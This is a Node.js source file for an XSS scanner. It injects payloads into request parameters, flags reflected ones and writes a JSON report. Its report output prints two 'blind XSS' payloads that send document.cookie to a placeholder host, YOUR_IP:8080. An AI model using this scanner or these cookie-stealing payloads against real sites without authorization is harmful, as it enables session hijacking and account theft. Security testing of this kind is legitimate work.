
const axios = require('axios')
const fs = require('fs')
const chalk = require('chalk')
const ora = require('ora')

class XSSScanner {
  constructor(options = {}) {
    this.targetUrl = options.url
    this.params = options.params || []
    this.method = (options.method || 'GET').toUpperCase()
    this.threads = options.threads || 20
    this.outputFile = options.outputFile || 'xss_results.json'
    this.timeout = options.timeout || 10000
    this.cookie = options.cookie || ''
    this.userAgent = options.userAgent || 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
    this.delay = options.delay || 0
    this.results = []
    this.totalTests = 0
    this.completedTests = 0

    this.httpConfig = {
      timeout: this.timeout,
      headers: {
        'User-Agent': this.userAgent,
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.5',
      },
      maxRedirects: 0,
      validateStatus: () => true,
    }

    if (this.cookie) {
      this.httpConfig.headers['Cookie'] = this.cookie
    }
  }

  async testPayload(param, payload) {
    const parsedUrl = new URL(this.targetUrl)

    if (this.method === 'GET') {
      parsedUrl.searchParams.set(param, payload)
    }

    const fullUrl = parsedUrl.toString()
    const startTime = Date.now()

    try {
      let response

      if (this.method === 'POST') {
        const formData = new URLSearchParams()
        formData.append(param, payload)
        response = await axios.post(this.targetUrl, formData.toString(), {
          ...this.httpConfig,
          headers: {
            ...this.httpConfig.headers,
            'Content-Type': 'application/x-www-form-urlencoded',
          },
        })
      } else {
        response = await axios.get(fullUrl, this.httpConfig)
      }

      const elapsed = Date.now() - startTime
      const body = typeof response.data === 'string' ? response.data : JSON.stringify(response.data)
      const decodedPayload = decodeURIComponent(payload)

      const reflected = body.includes(payload) || 
                        body.includes(decodedPayload) ||
                        body.includes(encodeURIComponent(payload))

      const result = {
        url: fullUrl,
        parameter: param,
        payload: payload,
        status: response.status,
        length: body.length,
        time: elapsed,
        reflected: reflected,
        method: this.method,
      }

      this.results.push(result)
      return result

    } catch (error) {
      return {
        url: fullUrl,
        parameter: param,
        payload: payload,
        status: 0,
        length: 0,
        time: Date.now() - startTime,
        reflected: false,
        method: this.method,
        error: error.message,
      }
    }
  }

  async scan(payloads) {
    const spinner = ora('Initializing scan...').start()

    this.totalTests = this.params.length * payloads.length

    console.log(chalk.cyan('\n╔══════════════════════════════════════════╗'))
    console.log(chalk.cyan('║        Node.js XSS Hunter v1.0            ║'))
    console.log(chalk.cyan('╚══════════════════════════════════════════╝'))
    console.log(chalk.white(`[*] Target: ${this.targetUrl}`))
    console.log(chalk.white(`[*] Parameters: ${this.params.join(', ')}`))
    console.log(chalk.white(`[*] Method: ${this.method}`))
    console.log(chalk.white(`[*] Payloads: ${payloads.length}`))
    console.log(chalk.white(`[*] Threads: ${this.threads}`))
    console.log(chalk.white(`[*] Total tests: ${this.totalTests}\n`))

    const batchSize = this.threads

    for (const param of this.params) {
      for (let i = 0; i < payloads.length; i += batchSize) {
        const batch = payloads.slice(i, i + batchSize)
        const promises = batch.map(payload => this.testPayload(param, payload))

        await Promise.all(promises)

        this.completedTests += batch.length
        const percent = ((this.completedTests / this.totalTests) * 100).toFixed(1)
        const vulnCount = this.results.filter(r => r.reflected).length

        if (spinner) {
          spinner.text = `Testing... ${this.completedTests}/${this.totalTests} (${percent}%) | Found: ${vulnCount}`
        }

        if (this.delay > 0) {
          await new Promise(resolve => setTimeout(resolve, this.delay))
        }
      }
    }

    spinner.stop()
    this.generateReport()
  }

  generateReport() {
    const vulnerabilities = this.results.filter(r => r.reflected)

    console.log(chalk.cyan('\n═══════════════════════════════════════════'))
    console.log(chalk.cyan('            SCAN RESULTS'))
    console.log(chalk.cyan('═══════════════════════════════════════════\n'))

    if (vulnerabilities.length === 0) {
      console.log(chalk.yellow('[-] No XSS vulnerabilities detected.'))
    } else {
      console.log(chalk.green(`[+] Found ${vulnerabilities.length} potential XSS vulnerabilities!\n`))

      vulnerabilities.forEach((vuln, index) => {
        console.log(chalk.red(`${'='.repeat(60)}`))
        console.log(chalk.red(`[!] Vulnerability #${index + 1}`))
        console.log(chalk.red(`${'='.repeat(60)}`))
        console.log(chalk.white(`    URL:       ${vuln.url}`))
        console.log(chalk.white(`    Parameter: ${vuln.parameter}`))
        console.log(chalk.white(`    Payload:   ${chalk.yellow(vuln.payload)}`))
        console.log(chalk.white(`    Method:    ${vuln.method}`))
        console.log(chalk.white(`    HTTP:      ${vuln.status}`))
        console.log(chalk.white(`    Length:    ${vuln.length} bytes`))
        console.log(chalk.white(`    Time:      ${vuln.time}ms\n`))

        console.log(chalk.cyan('    Blind XSS payload suggestions:'))
        console.log(chalk.gray(`    <script>fetch('http://YOUR_IP:8080/?c='+document.cookie)</script>`))
        console.log(chalk.gray(`    <script>new Image().src='http://YOUR_IP:8080/?c='+document.cookie</script>\n`))
      })
    }

    const report = {
      scanTime: new Date().toISOString(),
      target: this.targetUrl,
      parameters: this.params,
      method: this.method,
      totalTests: this.totalTests,
      vulnerabilitiesFound: vulnerabilities.length,
      results: vulnerabilities.map(v => ({
        url: v.url,
        parameter: v.parameter,
        payload: v.payload,
        method: v.method,
        status: v.status,
      })),
    }

    fs.writeFileSync(this.outputFile, JSON.stringify(report, null, 2))
    console.log(chalk.green(`\n[*] Report saved to: ${this.outputFile}`))
  }
}

module.exports = XSSScanner
